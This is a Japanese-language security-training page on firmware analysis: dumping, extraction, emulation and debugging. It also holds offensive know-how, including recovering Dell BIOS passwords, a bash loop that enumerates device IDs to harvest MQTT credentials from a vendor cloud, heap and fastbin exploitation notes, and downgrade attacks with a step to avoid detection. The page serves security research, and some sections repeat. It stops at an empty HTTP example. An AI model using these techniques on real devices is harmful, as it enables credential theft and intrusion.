# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・促進し、デバイスが正しく動作するために不可欠なソフトウェアです。永続メモリに保存されているため、デバイスの電源を入れた直後から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。セキュリティ上の脆弱性を特定するうえで、Firmwareの調査と、場合によっては変更が重要なステップとなります。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用しているテクノロジーを理解するための重要な初期ステップです。このプロセスでは、次の情報を収集します。

- CPUアーキテクチャと実行しているオペレーティングシステム
- Bootloaderの詳細
- ハードウェア構成とデータシート
- コードベースの指標とソースの場所
- 外部ライブラリとライセンスの種類
- アップデート履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定済みの脆弱性

この目的には、**open-source intelligence (OSINT)** ツールが非常に役立ちます。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動でレビューして分析することも有効です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのツールでは、潜在的な問題を見つけるために活用できる無料の静的解析を利用できます。

## **Firmwareの取得**

Firmwareを入手する方法はいくつかあり、それぞれ難易度が異なります。

- 開発者やメーカーなどの提供元から**直接入手**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているFirmwareファイルを探すために**Google dork**検索を利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのツールを使い、**cloud storage**に直接アクセスする
- man-in-the-middle技術を使って**アップデート**を傍受する
- **UART**、**JTAG**、**PICit**などの接続を介してデバイスから**抽出**する
- デバイスの通信を監視してアップデート要求を**スニッフィング**する
- **ハードコードされたアップデートエンドポイント**を特定して利用する
- Bootloaderまたはネットワークから**ダンプ**する
- 他の手段がすべて失敗した場合、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTのみのログ: フラッシュ内のU-Boot envを使ってroot shellを強制起動する

UART RXが無視される場合（ログのみ）、オフラインで**U-Boot environment blobを編集**することで、init shellを強制起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプする:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env パーティションを特定し、`bootargs` を編集して `init=/bin/sh` を含め、blob の **U-Boot env CRC32 を再計算**します。
3. env パーティションのみを書き換えて再起動すると、UART 上に shell が表示されます。

これは、bootloader shell は無効になっているものの、外部 flash アクセス経由で env パーティションに書き込み可能な組み込みデバイスで役立ちます。

## ファームウェアの解析

これで**ファームウェアを入手できた**ので、どのように扱うべきかを把握するため、その情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` を使ってイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されている可能性は低いでしょう。エントロピーが高ければ、暗号化されている可能性が高いです（何らかの方法で圧縮されている場合もあります）。

さらに、次のツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使ってファイルを調べることもできます。

### 差分フラッシュ解析と復元可能な XOR シークレットストア

ファームウェア設定の保存形式が文書化されていない場合は、まず一致するフラッシュ読み出しを複数回行い、設定を**1つだけ**変更してから、チップ全体を再度ダンプし、オフセットを比較します。値を管理して実験を繰り返すことで、その設定に起因する変化とカウンターや書き込みメタデータによる変化を区別できます。データが同じ場所ではなく新しいオフセットに現れる場合は、追記専用またはログ構造型のストアであることを示しています。削除済みまたは tombstone 化されたエントリも保持してください。ペイロードのバイト列が復元可能な場合があります。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

対象領域を特定したら、`binwalk` などのツールでファームウェアモジュールを抽出し、Ghidraで書き込み処理と検証処理をリバースエンジニアリングします。暗号文のパターンだけから方式を推測するのではなく、コードでフィールド境界、パディング、鍵のインデックス付け、鍵導出を確認してください。<sup>[[10]](#references)</sup>

#### 暗号化されたゼロパディングから鍵を復元する

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)で説明したように、既知平文からは同じオフセットのキーストリームバイトが明らかになります。固定サイズのフィールドでは、ゼロパディングが繰り返しXOR鍵のすべてのインデックスに及ぶ場合、特に情報が漏れやすくなります。`0x00 XOR key_byte = key_byte` のため、暗号化されたパディングから鍵のバイトが直接分かるからです。鍵のすべてのインデックスが網羅されていれば、暗号文の末尾から鍵を復元し、データが格納されたバイトを復号できます。<sup>[[10]](#references)</sup>

Dellの脆弱なDVAR BIOSパスワード形式は、その具体例です。32バイトのフィールドのうち、バイト`0`は平文で、バイト`1..31`には20バイトの繰り返し鍵が使われます。<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワード長が `L` の場合、XOR 前は位置 `L..31` がゼロでした。`L <= 12` では、これらの位置がすべての key インデックスを網羅するため、brute force を行わずに key とパスワード全体を復元できます:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 履歴レコードからキーを取り出す

各レコードを個別に解析しないでください。DVARキーはおおよそ`modified_md5(device_seed || variable_GUID || password[0])`として導出されます。device seedとGUIDは固定されており、パスワードに依存する入力は平文の先頭バイトだけです。そのため、デバイスごとのキーは最大256個で、同じバイトで始まるレコードは同じキーを共有します。アクティブなレコードと削除済みのレコードをそのバイトごとにグループ化してください。短い履歴レコードは、パディングを通じて完全なキーをleakし、自身のパディングだけでは不十分な現在の長いレコードを復号できることがあります。したがって、古い暗号文を消去せずにtombstone化すると、パスワードのローテーションによって露出が増える可能性があります。<sup>[[10]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn)ツールはDVARを特定し、候補レコードを検証し、パスワードを復元して、保存されている生のバイト列やキーのバイト列を表示できます。checkoutからビルドし、検証済みのflashイメージを次のようにスキャンしてください。<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングのチェック、鍵のエントロピー、鍵が折り返す位置での一貫性を使って誤検出を排除してください。複数回のダンプで書き込みごとのビット反転がまばらに見られる場合は、観測されたマスクを列挙し、これらの制約に基づいて修正候補を順位付けしてください。ただし、曖昧な文字はヒューリスティックな出力を正確な復元結果として示さず、曖昧なまま報告してください。<sup>[[10]](#references)</sup>

パスワード検証子には、可逆暗号文ではなく、ソルトを付与して反復処理した一方向ハッシュを保存してください。また、ログ構造化ストアでは、置き換えられた秘密情報を安全に削除してください。<sup>[[10]](#references)</sup>

### ファイルシステムの取得

前述のコメント付きツール（`binwalk -ev <bin>` など）を使えば、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、**ファイルシステムの種類名を付けたフォルダー**内に抽出します。ファイルシステムの種類は通常、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs のいずれかです。

#### ファイルシステムの手動抽出

場合によっては、binwalk のシグネチャにファイルシステムのマジックバイトが含まれていないことがあります。そのような場合は、binwalk を使って**ファイルシステムのオフセットを特定し、圧縮されたファイルシステムをバイナリから切り出して**、以下の手順に従い、種類に応じて**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs ファイルシステムを carving するために、以下の **dd command** を実行します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

実行後、ファイルは"`squashfs-root`"ディレクトリに配置されます。

- CPIOアーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NANDフラッシュを使用するubifsファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

ファームウェアを入手したら、その構造と潜在的な脆弱性を理解するために、内容を詳細に調べることが重要です。このプロセスでは、さまざまなツールを使用してファームウェアイメージを分析し、有用なデータを抽出します。

### Initial Analysis Tools

バイナリファイル（`<bin>`と表記）の初期調査に使うコマンドを以下に示します。これらのコマンドは、ファイルタイプの特定、文字列の抽出、バイナリデータの分析、パーティションやファイルシステムの詳細の把握に役立ちます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状況を評価するには、`binwalk -E <bin>` を使って**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。

**埋め込みファイル**の抽出には、**file-data-carving-recovery-tools**のドキュメントや、ファイル検査用の**binvis.io**などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類（例: squashfs、ubifs）にちなんだ名前のディレクトリに抽出されます。ただし、magic bytes が欠落していて **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。`binwalk` でファイルシステムのオフセットを特定してから、`dd` コマンドでファイルシステムを切り出します。

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するためのコマンドを使い分けます。

### ファイルシステムの分析

ファイルシステムを抽出したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、APIエンドポイント、アップデートサーバーの機能、コンパイルされていないコード、起動スクリプト、オフライン分析用のコンパイル済みバイナリに注目します。

確認すべき**主な場所**と**項目**は次のとおりです。

- ユーザー認証情報を確認する **etc/shadow** と **etc/passwd**
- **etc/ssl** 内のSSL証明書と鍵
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる分析が必要な組み込みバイナリ
- IoTデバイスでよく使われるWebサーバーとバイナリ

ファイルシステム内の機密情報や脆弱性の発見には、次のようなツールが役立ちます。

- 機密情報の検索に使う [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なファームウェア分析に使う [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析に使う [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、および [**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unixバイナリ用の **checksec.sh** やWindowsバイナリ用の **PESecurity** などのツールを使うと、悪用される可能性のある保護されていないバイナリを特定できます。

## 導出されたURLトークンを介したクラウド設定とMQTT認証情報の取得

多くのIoTハブは、次のようなクラウドエンドポイントからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア分析では、たとえば、`<token>` がハードコードされたシークレットを使ってデバイスIDからローカルで導出されていることが判明する場合があります。

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知っている人なら誰でもURLを再構築してクラウド設定を取得でき、多くの場合、平文のMQTT認証情報やトピックプレフィックスが明らかになります。

実践的な手順:

1) UARTの起動ログからdeviceIdを抽出する

- 3.3V UARTアダプター（TX/RX/GND）を接続して、ログを取得します:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URLパターンとbrokerアドレスを出力する行を探します。例:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmwareからSTATIC_KEYとtokenアルゴリズムを復元する

- バイナリをGhidra/radare2に読み込み、config path（"/pf/"）またはMD5の使用箇所を検索する。
- アルゴリズムを確認する（例：MD5(deviceId||STATIC_KEY)）。
- Bashでtokenを導出し、digestを大文字にする：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud configとMQTT credentialsを収集する

- URLを組み立て、curlでJSONを取得し、jqで解析してsecretを抽出する:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と弱い topic ACLs（存在する場合）を悪用する

- 回収した認証情報を使って maintenance topic を subscribe し、機密イベントを探す:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイス ID を列挙する（大規模に、許可を得て）

- 多くのエコシステムでは、ベンダーの OUI／製品／タイプを示すバイト列の後に、連番のサフィックスが続く形式が使われています。
- 候補となる ID を順に試し、token を導出して、プログラムから config を取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

メモ
- 大規模な列挙を試みる前に、必ず明示的な許可を得てください。
- 可能な場合は、対象ハードウェアを変更せずに秘密情報を復元するため、エミュレーションまたは静的解析を優先してください。


ファームウェアをエミュレートすることで、デバイスの動作または個々のプログラムの**動的解析**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となる場合がありますが、rootファイルシステムや特定のバイナリを、Raspberry Piなど、アーキテクチャとエンディアンが一致するデバイス、または構築済みの仮想マシンに転送することで、さらにテストを進められます。

### 個別のバイナリのエミュレート

単一のプログラムを調査する場合、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレートするには、次のコマンドを使用できます。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARMアーキテクチャのエミュレーション

ARMバイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレータを使用します。

### システム全体のエミュレーション

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションを行えます。これらのツールはプロセスを自動化し、動的解析を支援します。

### 分割され、検証されたルートファイルシステムのエミュレーション用再構築

SquashFS のスーパーブロックは読み取れるものの、inode、ディレクトリ、フラグメントテーブルのオフセットが不可能な値に見える場合、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースし、そこで作成されるブロックデバイスの構成を再現します。組み込みシステムでは、名目上のルートパーティションを公開しながら、別のパーティションから借用したセクターを追加する `dm-linear` マッピングを使って、実際のファイルシステムを構成していることがあります。後続のメタデータブロックがすべてずれていても、スーパーブロックだけの検査は成功する場合があります。<sup>[[9]](#references)</sup>

ファームウェアの計算方法を正確に再現してください。特に、長さの単位がバイト、512バイトセクター、4 KiBページのいずれなのかを特定し、シフトと切り捨てを元の順序で再現し、A/Bレイアウトにおけるバンク依存の末尾領域も考慮してください。たとえば、`(partition_bytes >> 12) << 3` は、まず 4 KiB 境界で切り捨ててから、結果を 512バイトセクター単位で表します。これを `partition_bytes // 512` に置き換えると、追加される領域の位置が数キロバイトずれ、後続の SquashFS テーブルがすべて破損する可能性があります。<sup>[[9]](#references)</sup>

有効な検証手順は次のとおりです。<sup>[[9]](#references)</sup>

1. verifier/init バイナリから、各 `dm-linear` セグメントのソースデバイス、開始セクター、長さを復元します。
2. アラインメントの扱いを変えずに、領域を連結またはマッピングします。
3. それでも展開に失敗する場合は、予測した境界の周辺にある小さな範囲だけを検索し、もっともらしいスーパーブロックだけで判断せず、連続する複数の有効なメタデータ構造があることを条件にします。
4. 再構築したイメージに変更していない `unsquashfs` を実行します。`unsquashfs -stat` よりも、すべてのディレクトリとフラグメントを正常にたどれることのほうが強い根拠になります。

#### 解析者が制御する dm-verity の置き換え

解析者が QEMU カーネル、initramfs、仮想ディスクを制御している場合、ベンダーの検証用 PID 1 を小さな静的リンク済み init に置き換えることで、変更したルートを起動できます。これは**ラボでのブートチェーン置き換え**であり、dm-verity、その RSA 署名、Secure Boot、TPM に封印されたキーを破るものではありません。<sup>[[9]](#references)</sup>

置き換え用 init は、元のブートパスの実動作を再現する必要があります。`devtmpfs` をマウントし、`setsid()` を呼び出し、`/dev/console` をファイルディスクリプタ 0～2 に接続し、`/proc` と `/sys` をマウントし、指定されたブロックデバイスを待ち、編集したルートを読み取り専用でマウントし、旧ルートの疑似ファイルシステムを切り離し、新しいマウントを `/` に移動し、`chroot` して、ファームウェア本来の `/sbin/init` を `execve()` で実行します。`MS_MOVE` の**前に**`/dev`、`/proc`、`/sys` を切り離すことで、新しいルートに属するマウントポイントを誤って切り離すことを防げます。<sup>[[9]](#references)</sup>

変更した不変ルートとは別に、変更可能なデバイス状態を保持してください。qcow2 オーバーレイを使えば元のディスクの LVM 状態を保持しつつ、編集済み SquashFS を格納した別の読み取り専用 virtio ディスクを使えます。<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインでのイメージ状態のデバッグ

起動が遅い、破壊的な起動スクリプトが実行される、またはコンソールログが不安定で障害の原因が分かりにくい場合は、ゲストの外部から永続状態を調べます。稼働中の VM が使用しているオーバーレイは決して接続しないでください。`qemu-nbd` で公開し、LVM の検出対象を目的の NBD パーティションに限定したうえで、切断する前にボリュームグループを非アクティブ化します。<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現可能な障害切り分けを行うには、書き込み可能な安定したボリュームにタイムスタンプ付きのマーカーファイルを書き込み、オフラインで確認してください。`/dev/kmsg`、FIFO、一時的なコンソールでは、レート制限やプロセスの早期終了により偽陰性が生じることがあります。また、無関係なコードを変更する前に、各レイヤー間でインターフェースが正確に一致するか比較してください。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 機能とカーネル設定、Mesa の `libGL` の世代と DRI driver ABI、および PCI 情報から導出されるドライバー名を比較します。コンポーネントが存在し、`dlopen()` に成功しても、利用側が異なる ABI を想定しているために使用できないことがあります。<sup>[[9]](#references)</sup>

## 実践的な動的解析

この段階では、実機またはエミュレートされたデバイス環境を使って解析します。OS とファイルシステムへの shell access を維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全には再現できない場合があり、その際はエミュレーションを再起動する必要があります。解析では、ファイルシステムを再確認し、公開されているWebページやネットワークサービスを exploit し、ブートローダーの脆弱性を調査します。潜在的なバックドアの脆弱性を特定するには、ファームウェアの整合性テストが重要です。

## ランタイム解析の手法

ランタイム解析では、gdb-multiarch、Frida、Ghidra などのツールを使い、実行環境内でプロセスやバイナリを操作します。ブレークポイントを設定し、fuzzing などの手法で脆弱性を特定します。

完全なデバッガーを利用できない組み込みターゲットでは、**静的リンクされた `gdbserver` をデバイスにコピーし、リモートから接続します**。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor メッセージマッピング

IoT ハブでは、RF スタックが**radio MCU**と Linux のユーザーランドプロセスに分割されていることがよくあります。有用な手順は、次の経路をマッピングすることです:<sup>[[8]](#references)</sup>

1. 無線上の**RF frame**
2. radio MCU 上の**controller-side parser**
3. Linux に転送される**serial/UART text or TLV protocol**（例: `/dev/tty*`）
4. メインデーモン内の**application dispatcher**
5. **protocol-specific handler / state machine**

このアーキテクチャでは、解析対象が1つではなく2つになります。コントローラーがバイナリの無線フレームを `Group,Command,arg1,arg2,...` のようなテキストプロトコルに変換する場合は、次を特定します:

- **message groups**とディスパッチテーブル
- ネットワークから送信可能なメッセージと、コントローラー自体から送信されるメッセージの区別
- 正確な**manufacturer-specific discriminator fields**（例: Zigbee の `manufacturer_code` とカスタムの `cluster_command`）
- **commissioning**、discovery、firmware/model download の各フェーズでのみ到達可能なハンドラー

特に Zigbee では、ペアリング通信をキャプチャし、対象デバイスがデフォルトの**Link Key** `ZigBeeAlliance09` に依存しているか確認します。依存している場合、commissioning 通信のスニッフィングによって**Network Key**が漏えいする可能性があります。Zigbee 3.0 の install code はこのリスクを軽減するため、テスト対象のデバイスが実際に install code を強制しているか記録してください。

### Manufacturer-specific protocol handlers と FSM に制御された到達可能性

ベンダー固有の Zigbee/ZCL コマンドは、標準化された cluster よりも有力なターゲットとなることがよくあります。これは、十分に検証されていない**custom parsing code**や内部**FSM**に処理が渡るためです。<sup>[[8]](#references)</sup>

実践的な手順:

- コマンドディスパッチャーを解析し、**vendor-only handler**を特定します。
- **FSM state**、**event**、**check**、**action**、**next-state**の各テーブルを復元します。
- 自動的に次へ進む**transitional states**と、最終的に攻撃者が制御する状態をリセットまたは解放する retry/error 分岐を特定します。
- バグのあるハンドラーに常に到達できると決めつけず、脆弱な状態にデーモンを移行させるために必要な正規のプロトコル通信を確認します。

タイミングに敏感なプロトコルでは、Python framework によるパケット再送では遅すぎる場合があります。より確実な方法は、ベンダーグレードのスタックを備えた実機（例: **nRF52840**）で正規デバイスをエミュレートし、適切な**endpoints**、**attributes**、commissioning のタイミングを再現することです。

### 組み込みデーモンにおける Fragmented-download bug class

**fragmented blob/model/configuration downloads**では、繰り返し見られるファームウェアのバグがあります:<sup>[[8]](#references)</sup>

1. **最初の fragment**（`offset == 0`）で `ctx->total_size` を保存し、`malloc(total_size)` を実行します。
2. 後続の fragment では、`packet_total_size >= offset + chunk_len` のような、攻撃者が制御する**packet-local**フィールドだけを検証します。
3. コピー処理では、元の割り当てサイズとの照合をせずに `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を実行します。

これにより、攻撃者は次のことができます:

- **小さい** total size を指定した有効な最初の fragment を送り、小さなヒープ領域を確保させる。
- **想定された offset**を指定しつつ、より大きな `chunk_len` を持つ後続の fragment を送る。
- 新しい検証を通過する偽の packet-local size を使いながら、元の割り当て済みバッファをオーバーフローさせる。

脆弱な処理経路が commissioning ロジックの背後にある場合、不正な fragment を送る前に、対象を想定された model-download または blob-download の状態へ移行させるための十分な**device emulation**が必要です。

### Protocol-driven `free()` triggers

組み込みデーモンでは、ヒープメタデータの悪用を引き起こす最も簡単な方法は、多くの場合「クリーンアップを待つ」ことではなく、**プロトコル独自のエラー処理を強制する**ことです:<sup>[[8]](#references)</sup>

- 不正な後続 fragment を送り、FSM を**retry**または**error**状態へ移行させます。
- retry のしきい値を超えさせ、デーモンに**context**をリセットさせて破損したバッファを解放させます。
- この予測可能な `free()` を利用して、無関係な原因でプロセスがクラッシュする前に、アロケーター側のプリミティブを発動させます。

これは、組み込み Linux の**musl/uClibc/dlmalloc-like**アロケーターに対して特に有用です。チャンクメタデータの破損により、unlink/unbin ロジックを write primitive に変えられる可能性があります。安定した手法は、サイズフィールドを破損させ、オーバーフローしたバッファ内に配置した**fake chunks**へアロケーターの走査を誘導することです。bin ポインターを直接破壊してプロセスをクラッシュさせる方法は避けます。

## Binary Exploitation and Proof-of-Concept

特定した脆弱性の PoC を開発するには、対象アーキテクチャの深い理解と、低水準言語によるプログラミングが必要です。組み込みシステムではバイナリのランタイム保護はまれですが、存在する場合は Return Oriented Programming (ROP) などの手法が必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc は glibc と同様の fastbins を使用します。後続の大きな割り当てで `__malloc_consolidate()` が呼び出されることがあるため、fake chunk はチェック（妥当な size、`fd = 0`、周辺のチャンクが「使用中」と認識されること）を通過できなければなりません。<sup>[[6]](#references)</sup>
- **ASLR 下の non-PIE binaries:** ASLR が有効でも、メインバイナリが**non-PIE**なら、バイナリ内の `.data/.bss` アドレスは安定しています。正当なヒープチャンクヘッダーに似た領域を狙い、fastbin の割り当て先を**function pointer table**にできます。
- **Parser-stopping NUL:** JSON の解析時に、payload 内の `\x00` で解析を停止させながら、その後に続く攻撃者制御のバイト列をスタックピボット/ROP chain 用に残せます。
- **`/proc/self/mem` 経由の Shellcode:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出す ROP chain で、既知のマッピング領域に実行可能な shellcode を配置し、そこへジャンプできます。

## ファームウェア解析用の準備済みオペレーティングシステム

[AttifyOS](https://github.com/adi0x90/attifyos)や[EmbedOS](https://github.com/scriptingxss/EmbedOS)のようなオペレーティングシステムは、ファームウェアのセキュリティテストに必要なツールを備えた、事前設定済みの環境を提供します。

## ファームウェア解析用の準備済み OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) デバイスのセキュリティ評価と penetration testing を支援することを目的としたディストリビューションです。必要なツールがすべて読み込まれた事前設定済み環境を提供するため、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ファームウェアセキュリティテスト用ツールがあらかじめインストールされた、Ubuntu 18.04 ベースの組み込みセキュリティテスト用オペレーティングシステムです。

## ファームウェアの Downgrade Attacks と Insecure Update Mechanisms

ベンダーがファームウェアイメージの暗号署名を検証していても、**version rollback（downgrade） protection は実装されていないことがよくあります**。boot loader または recovery loader が埋め込み公開鍵で署名を検証するだけで、書き込まれるイメージの*version*（または monotonic counter）を比較しない場合、攻撃者は**有効な署名が付いた古い脆弱なファームウェア**を正規の手順でインストールでき、修正済みの脆弱性を再び持ち込めます。<sup>[[4]](#references)</sup>

典型的な攻撃手順:

1. **古い署名済みイメージを入手する**
   * ベンダーの公開ダウンロードポータル、CDN、またはサポートサイトから取得します。
   * 関連するモバイル/デスクトップアプリケーションから抽出します（例: Android APK 内の `assets/firmware/`）。
   * VirusTotal、Internet archives、フォーラムなどのサードパーティリポジトリから取得します。
2. 公開されている更新チャネルを使って、イメージをデバイスに**アップロードするか配信します**:
   * Web UI、モバイルアプリ API、USB、TFTP、MQTT など。
   * 多くのコンシューマー向け IoT デバイスでは、Base64 エンコードされたファームウェア blob を受け付け、サーバー側でデコードして recovery/upgrade を開始する、*認証不要*の HTTP(S) endpoint が公開されています。
3. downgrade 後、新しいリリースで修正された脆弱性を悪用します（例: 後のバージョンで追加された command-injection filter）。
4. 必要に応じて、永続化を得た後に検出を避けるため、最新イメージに戻すか更新を無効にします。

### 例: Downgrade 後の Command Injection

```http
